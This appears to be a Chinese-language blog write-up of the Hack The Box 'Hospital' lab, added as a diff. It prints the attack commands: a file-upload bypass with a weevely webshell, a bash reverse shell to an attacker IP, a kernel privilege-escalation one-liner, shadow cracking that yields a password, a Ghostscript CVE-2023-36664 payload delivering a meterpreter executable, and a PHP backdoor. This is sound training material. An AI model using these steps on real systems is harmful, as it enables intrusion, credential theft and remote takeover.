@@ -1,0 +1,137 @@
+<hr>
+<h2 id="title-HTB-Hospital-Writeupdate-2024-4-23categories-Lab-Writeuptags-Hack-The-Box"><a href="#title-HTB-Hospital-Writeupdate-2024-4-23categories-Lab-Writeuptags-Hack-The-Box" class="headerlink" title="title: HTB Hospital Writeupdate: 2024-4-23categories: Lab Writeuptags: Hack The Box"></a>title: HTB Hospital Writeup<br>date: 2024-4-23<br>categories: Lab Writeup<br>tags: Hack The Box</h2><h3 id="Portinfo："><a href="#Portinfo：" class="headerlink" title="Portinfo："></a>Portinfo：</h3><pre><code class="bash">nmap 10.10.11.241 -n -Pn -p- -sT --min-rate 2000
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421173314650.png" alt="image-20240421173314650"></p>
+<pre><code class="bash">nmap 10.10.11.241 -p22,53,88,135,139,443,445,389,1801,2103,2105,2107,2179,3389,6404,6406,6407,6409,6617,6639,8080,9389 -sC -sV -oN portinfo.txt -Pn
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421180444299.png" alt="image-20240421180444299"></p>
+<p>目标域名为<strong>hospital.htb</strong>，Windows机器，但是有Ubuntu的SSH服务，疑似存在容器，端口映射的现象。</p>
+<h3 id="GetShell："><a href="#GetShell：" class="headerlink" title="GetShell："></a>GetShell：</h3><p>8080端口运行一个web服务：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421182950757.png" alt="image-20240421182950757"></p>
+<p>获取目录信息：</p>
+<pre><code>dirsearch -u http://hospital.htb:8080/
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421193832599.png" alt="image-20240421193832599"></p>
+<p>没有账号密码，但是在以下地址可以注册一个：</p>
+<pre><code>http://hospital.htb:8080/register.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421183025332.png" alt="image-20240421183025332"></p>
+<p>登录成功有一个文件上传接口：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421183148093.png" alt="image-20240421183148093"></p>
+<p>目标站点是PHP类型的，尝试上传php文件：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421184745988.png" alt="image-20240421184745988"></p>
+<p>如果将其更改为pdf会上传成功：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421184926194.png" alt="image-20240421184926194"></p>
+<p>枚举可上传的php执行文件后缀：</p>
+<pre><code class="bash">.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421193345218.png" alt="image-20240421193345218"></p>
+<p>执行枚举：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421193303411.png" alt="image-20240421193303411"></p>
+<p><strong>phar</strong>可以正常上传：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421193852873.png" alt="image-20240421193852873"></p>
+<p>phpinfo里显示了一堆函数被禁用：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421194500241.png" alt="image-20240421194500241"></p>
+<p>可以用weevely自动化bypass disable_functions，生成webshell：</p>
+<pre><code class="bash">weevely generate &#39;password123&#39; backdoor.phar
+</code></pre>
+<p>上传后使用weevely进行连接并反弹shell：</p>
+<pre><code class="bash">weevely http://hospital.htb:8080/uploads/backdoor.phar password123
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421202342884.png" alt="image-20240421202342884"></p>
+<pre><code class="bash">bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.28/443 0&gt;&amp;1&quot;
+</code></pre>
+<p>收到shell：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421202405970.png" alt="image-20240421202405970"></p>
+<h3 id="GetDrwilliams："><a href="#GetDrwilliams：" class="headerlink" title="GetDrwilliams："></a>GetDrwilliams：</h3><p>升级shell：</p>
+<pre><code class="bash">script -qc /bin/bash /dev/null
+CTRL+Z;
+stty raw -echo; fg; 
+reset;
+screen;
+</code></pre>
+<p>查看内核版本：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421202904391.png" alt="image-20240421202904391"></p>
+<p>该内核版本有提权漏洞：</p>
+<pre><code>https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----887fd3d6fee9--------------------------------
+</code></pre>
+<p>输入如下命令：</p>
+<pre><code class="bash">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&quot;cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash&quot;)&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421203224697.png" alt="image-20240421203224697"></p>
+<p>读取passwd：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421203527409.png" alt="image-20240421203527409"></p>
+<p>读取shadow：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421203609501.png" alt="image-20240421203609501"></p>
+<p>破解shadow可以获取到drwilliams用户的密码：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240421204003410.png" alt="image-20240421204003410"></p>
+<pre><code class="bash">drwilliams:qwe123!@#
+</code></pre>
+<h3 id="GetDrbrown："><a href="#GetDrbrown：" class="headerlink" title="GetDrbrown："></a>GetDrbrown：</h3><p>使用密码可以访问443端口的mail服务：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240423173927648.png" alt="image-20240423173927648"></p>
+<p>GhostScript存在一个CVE-2023-36664，漏洞分析可看以下文章：</p>
+<pre><code class="http">https://www.kroll.com/en/insights/publications/cyber/ghostscript-cve-2023-36664-remote-code-execution-vulnerability
+</code></pre>
+<p>EXP可以在github上找到：</p>
+<pre><code class="http">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
+</code></pre>
+<p>使用msfvenom生成exe：</p>
+<pre><code class="bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.28 LPORT=443 -f exe -o shell.exe
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424102229515.png" alt="image-20240424102229515"></p>
+<p>制作payload：</p>
+<pre><code class="bash"> python CVE_2023_36664_exploit.py --inject --payload &#39;cmd.exe /c \\\\10.10.16.28\\share\\shell.exe&#39; --filename file.eps
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424102518769.png" alt="image-20240424102518769"></p>
+<p>启动smbserver：</p>
+<pre><code class="bash">smbserver.py share . -smb2support
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424102543137.png" alt="image-20240424102543137"></p>
+<p>对邮件进行回复：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424102823767.png" alt="image-20240424102823767"></p>
+<p>共享被访问：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424102951089.png" alt="image-20240424102951089"></p>
+<p>监听到Meterpreter会话：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424103244935.png" alt="image-20240424103244935"></p>
+<p>为保证不必要的麻烦，进行进程迁移：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424103343817.png" alt="image-20240424103343817"></p>
+<p>用户flag：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142047940.png" alt="image-20240424142047940"></p>
+<p>GetSystem：</p>
+<p>获取web权限：</p>
+<pre><code>upload /usr/share/webshells/php/simple-backdoor.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142320186.png" alt="image-20240424142320186"></p>
+<p>Web服务是以system权限运行的：</p>
+<pre><code class="bash">curl -k https://hospital.htb/simple-backdoor.php?cmd=whoami
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142452737.png" alt="image-20240424142452737"></p>
+<p>上传木马：</p>
+<pre><code class="bash">upload /home/kali/Expliot/CVE-2023-36664-Ghostscript-command-injection/shell.exe
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142703802.png" alt="image-20240424142703802"></p>
+<p>启动木马：</p>
+<pre><code class="bash">curl -k https://hospital.htb/simple-backdoor.php?cmd=shell.exe
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142805471.png" alt="image-20240424142805471"></p>
+<p>收到会话回连：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424142728347.png" alt="image-20240424142728347"></p>
+<p>获取root.txt:</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240424143048321.png" alt="image-20240424143048321"></p>
